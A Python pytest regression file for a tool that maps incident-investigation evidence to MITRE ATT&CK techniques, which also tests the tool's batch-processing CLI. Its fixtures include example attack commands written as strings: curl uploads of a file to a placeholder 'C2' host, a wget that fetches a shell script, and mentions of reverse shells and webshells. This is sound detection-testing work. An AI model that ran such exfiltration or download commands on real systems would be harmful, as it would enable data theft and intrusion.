"""Regression cases from the 2026-09-27 review, using the real rule catalog."""
import builtins
import errno
import io
import json
import os
import subprocess
import sys
import threading
from concurrent.futures import ThreadPoolExecutor
from copy import deepcopy
from pathlib import Path

import pytest

from attack_mapping.cli import run
from attack_mapping import cli
from attack_mapping.engine import map_investigation, match_evidence, match_verdict
from attack_mapping.rules import ALL_RULES
from tests.test_attack_mapping_cli import evidence, investigation


def mapped(description, **changes):
    source = investigation(
        final_verdict={"verdict": "THREAT_CONFIRMED", "attack_type": "unlisted"},
        evidence_chain=[evidence(description=description, **changes)],
    )
    before = deepcopy(source)
    result = map_investigation(source, ALL_RULES)
    assert source == before
    assert not result["errors"]
    return result


def ids(result):
    return {item["technique_id"] for item in result["techniques"]}


@pytest.mark.parametrize("command", ["curl -t TTYPE=vt100", "curl --telnet-option TTYPE=vt100"])
def test_telnet_option_never_becomes_upload_even_with_c2_context(command):
    assert "T1041" not in ids(mapped(command + " telnet://example.invalid (known C2 channel)"))


@pytest.mark.parametrize("command", ["curl -T data.txt", "curl   -T data.txt", "curl --upload-file data.txt"])
def test_upload_options_preserve_case_and_require_related_c2_evidence(command):
    result = mapped(command + " https://example.invalid (known C2 channel)")
    assert "T1041" in ids(result)
    exfil = next(item for item in result["techniques"] if item["technique_id"] == "T1041")
    assert "curl -t" not in exfil["matched_keywords"]
    assert exfil["raw_refs"] == ["audit.log:11"]
    assert "T1041" not in ids(mapped(command + " https://example.invalid"))


@pytest.mark.parametrize("description", [
    "reverse shell 연결은 확인됐으나 웹셸 실행은 확인되지 않았음",
    "reverse shell observed, but no webshell execution was observed",
    "웹셸 실행은 미확인. reverse shell 연결 확인",
    "reverse shell 연결 후 useradd --help 실행만 확인. 계정 생성은 없었음",
    "reverse shell observed; useradd --help was invoked, no account was created",
])
def test_denied_actions_do_not_remove_other_confirmed_actions(description):
    assert ids(mapped(description)) == {"T1059.004"}


@pytest.mark.parametrize("description", [
    "웹셸 실행은 확인되지 않았음", "웹셸 업로드 흔적 없음", "no php webshell observed",
    "php webshell not detected", "useradd --help", "useradd -h",
])
def test_negative_and_help_only_evidence_does_not_create_techniques(description):
    assert not ids(mapped(description))


def test_event_type_cannot_override_an_explicit_denial_in_description():
    assert not ids(mapped("php webshell not detected", event_type="php webshell"))


def test_verdict_negation_is_scoped_and_does_not_create_a_webshell_hit():
    hits = match_verdict({"final_verdict": {"attack_type": "reverse shell confirmed, but no web shell"}}, ALL_RULES)
    assert {item.technique_id for item in hits} == {"T1059.004"}


def test_authentication_failures_remain_a_positive_bruteforce_signal():
    assert "T1110" in ids(mapped("failed password repeated 30 times"))
    assert "T1110" in ids(mapped("SSH 인증 실패 30건"))


@pytest.mark.parametrize("scheme", ["http", "https"])
def test_command_boundaries_preserve_both_wget_url_schemes(scheme):
    assert "T1105" in ids(mapped(f"wget {scheme}://example.invalid/update.sh"))


@pytest.mark.parametrize("description", [
    "외부 서버로 전송. C2 통신과의 연관성은 확인되지 않았음",
    "known C2 channel not confirmed; curl -T data.txt https://example.invalid",
    "curl -T data.txt via known C2 channel, but C2 attribution is unconfirmed",
    "curl -T data.txt. 다른 프로세스의 기존 C2 채널 연결이 확인됨",
    "Large Outbound Data Transfer",
])
def test_c2_technique_is_not_inferred_from_missing_denied_or_unrelated_context(description):
    assert "T1041" not in ids(mapped(description))


def test_t1041_requires_eligible_evidence_not_a_verdict_only_label():
    source = investigation(final_verdict={"verdict": "THREAT_CONFIRMED", "attack_type": "exfiltration over C2 channel"},
                           evidence_chain=[])
    assert "T1041" not in ids(map_investigation(source, ALL_RULES))
    assert not match_verdict(source, ALL_RULES)
    source["evidence_chain"] = [evidence(description="기존 C2 채널로 외부 서버로 전송", raw_refs=[])]
    source["provenance"] = {"status": "incomplete"}
    assert "T1041" not in ids(map_investigation(source, ALL_RULES))


def test_c2_context_cannot_be_borrowed_from_another_evidence_or_field():
    source = investigation(final_verdict={"verdict": "THREAT_CONFIRMED", "attack_type": "unlisted"}, evidence_chain=[
        evidence(description="curl -T data.txt"),
        evidence("EVID-002", sequence=2, description="known C2 channel"),
    ])
    assert "T1041" not in ids(map_investigation(source, ALL_RULES))
    assert "T1041" not in ids(mapped("known C2 channel", event_type="curl -T data.txt"))


def write_input(path, payload=None, encoding="utf-8"):
    path.parent.mkdir(parents=True, exist_ok=True)
    path.write_text(json.dumps(investigation() if payload is None else payload), encoding=encoding)
    return path


def test_uppercase_extensions_and_utf8_bom_are_processed(tmp_path):
    inputs = tmp_path / "inputs"
    write_input(inputs / "a.json", investigation(incident_id="INC-A"))
    write_input(inputs / "b.JSON", investigation(incident_id="INC-B"), encoding="utf-8-sig")
    (inputs / "directory.json").mkdir()
    out = tmp_path / "out"
    assert run(["--all-in-dir", str(inputs), "--out-dir", str(out)]) == 0
    assert {p.name for p in out.glob("*_final_report.json")} == {"INC-A_final_report.json", "INC-B_final_report.json"}


def test_cp949_summary_output_does_not_abort_following_files(tmp_path):
    inputs = tmp_path / "inputs"
    write_input(inputs / "a.json", investigation(incident_id="INC-\U0001f600"))
    write_input(inputs / "b.json", investigation(incident_id="INC-NEXT"))
    out = tmp_path / "out"
    completed = subprocess.run([sys.executable, "-m", "attack_mapping.cli", "--all-in-dir", str(inputs),
                               "--out-dir", str(out)], cwd=Path(__file__).resolve().parents[1],
                              env={**os.environ, "PYTHONIOENCODING": "cp949"}, capture_output=True, timeout=20)
    assert completed.returncode == 0, completed.stderr
    assert (out / "INC-NEXT_final_report.json").exists()
    assert len(list(out.glob("*_final_report.json"))) == 2
    assert b"Traceback" not in completed.stderr


@pytest.mark.parametrize("depth", [600, 1500])
def test_deep_input_is_rejected_without_aborting_next_file(tmp_path, capsys, depth):
    inputs = tmp_path / "inputs"
    path = write_input(inputs / "a.json")
    path.write_text(json.dumps(investigation())[:-1] + ', "extra":' + '[' * depth + '0' + ']' * depth + '}', encoding="utf-8")
    write_input(inputs / "b.json", investigation(incident_id="INC-NEXT"))
    out = tmp_path / "out"
    assert run(["--all-in-dir", str(inputs), "--out-dir", str(out)]) == 1
    assert (out / "INC-NEXT_final_report.json").exists()
    assert len(list(out.glob("*_final_report.json"))) == 1
    assert "a.json" in capsys.readouterr().err


def test_same_input_and_output_directory_is_rejected_before_writing(tmp_path):
    original = write_input(tmp_path / "input.json").read_bytes()
    with pytest.raises(SystemExit) as error:
        run(["--all-in-dir", str(tmp_path), "--out-dir", str(tmp_path / ".")])
    assert error.value.code == 2
    assert list(tmp_path.iterdir()) == [tmp_path / "input.json"]
    assert (tmp_path / "input.json").read_bytes() == original


def test_generated_results_mixed_into_inputs_are_not_remapped(tmp_path, capsys):
    inputs = tmp_path / "inputs"
    # A legitimate input can have a name resembling an output filename.
    write_input(inputs / "source_final_report.json")
    out = tmp_path / "first"
    assert run(["--all-in-dir", str(inputs), "--out-dir", str(out)]) == 0
    for index, path in enumerate(out.glob("*.json")):
        (inputs / f"generated-{index}.json").write_bytes(path.read_bytes())
    second = tmp_path / "second"
    assert run(["--all-in-dir", str(inputs), "--out-dir", str(second)]) == 0
    assert len(list(second.glob("*_final_report.json"))) == 1
    assert "generated" in capsys.readouterr().err


def test_generated_artifact_as_only_input_reports_no_investigation_processed(tmp_path):
    original = write_input(tmp_path / "input.json")
    out = tmp_path / "out"
    assert run([str(original), "--out-dir", str(out)]) == 0
    generated = next(out.glob("*_final_report.json"))
    target = tmp_path / "unused"
    assert run([str(generated), "--out-dir", str(target)]) == 1
    assert not target.exists()


def test_missing_batch_directory_is_a_reported_error_not_a_traceback(tmp_path, capsys):
    assert run(["--all-in-dir", str(tmp_path / "missing")]) == 1
    assert "cannot list input directory" in capsys.readouterr().err


def test_failed_console_stream_does_not_drop_remaining_reports(tmp_path, monkeypatch):
    inputs = tmp_path / "inputs"
    write_input(inputs / "a.json", investigation(incident_id="INC-A"))
    write_input(inputs / "b.json", investigation(incident_id="INC-B"))
    out = tmp_path / "out"

    class BrokenConsole(io.StringIO):
        def write(self, value):
            raise OSError("simulated console failure")

    monkeypatch.setattr(sys, "stdout", BrokenConsole())
    assert run(["--all-in-dir", str(inputs), "--out-dir", str(out)]) == 1
    assert len(list(out.glob("*_final_report.json"))) == 2


@pytest.mark.parametrize("stage", ["open", "write"])
def test_failed_pair_save_cleans_only_new_files_and_keeps_processing(tmp_path, monkeypatch, stage):
    inputs = tmp_path / "inputs"
    write_input(inputs / "a.json", investigation(incident_id="INC-FAIL"))
    write_input(inputs / "b.json", investigation(incident_id="INC-GOOD"))
    out = tmp_path / "out"
    out.mkdir()
    existing = out / "INC-FAIL_final_report.json"
    existing.write_text("prior result", encoding="utf-8")

    class BrokenWriter:
        def __init__(self, stream):
            self.stream = stream

        def __enter__(self):
            return self

        def __exit__(self, *args):
            self.stream.close()

        def write(self, content):
            self.stream.write(content[:10])
            raise OSError(errno.ENOSPC, "simulated write failure")

    def opened(path, mode="r", *args, **kwargs):
        if str(path).endswith("INC-FAIL__2_final_report.json") and mode == "xb":
            if stage == "open":
                raise OSError(errno.ENOSPC, "simulated open failure")
            return BrokenWriter(builtins.open(path, mode, *args, **kwargs))
        return builtins.open(path, mode, *args, **kwargs)

    monkeypatch.setattr(cli, "open", opened, raising=False)
    assert run(["--all-in-dir", str(inputs), "--out-dir", str(out)]) == 1
    assert existing.read_text(encoding="utf-8") == "prior result"
    assert not list(out.glob("INC-FAIL__2*"))
    assert (out / "INC-GOOD_final_report.json").exists()


def test_concurrent_same_incident_writers_retry_without_losing_either_investigation(tmp_path, monkeypatch):
    inputs = [write_input(tmp_path / f"{i}.json", investigation(investigation_id=f"INV-{i}")) for i in (1, 2)]
    out = tmp_path / "out"
    barrier = threading.Barrier(2, timeout=5)
    local = threading.local()
    original_paths = cli._output_paths

    def synchronized_paths(*args):
        paths = original_paths(*args)
        if not getattr(local, "synchronized", False):
            local.synchronized = True
            barrier.wait()
        return paths

    monkeypatch.setattr(cli, "_output_paths", synchronized_paths)
    with ThreadPoolExecutor(max_workers=2) as executor:
        results = list(executor.map(lambda path: cli.process_file(str(path), ALL_RULES, str(out)), inputs))
    assert all(result["mapping_status"] == "mapped" for result in results)
    reports = list(out.glob("*_final_report.json"))
    assert len(reports) == 2
    assert {json.loads(path.read_text(encoding="utf-8"))["investigation_id"] for path in reports} == {"INV-1", "INV-2"}
    for path in reports:
        report = json.loads(path.read_text(encoding="utf-8"))
        mapping_path = path.with_name(path.name.replace("_final_report.json", "_attack_mapping.json"))
        assert report["attack_mapping"] == json.loads(mapping_path.read_text(encoding="utf-8"))
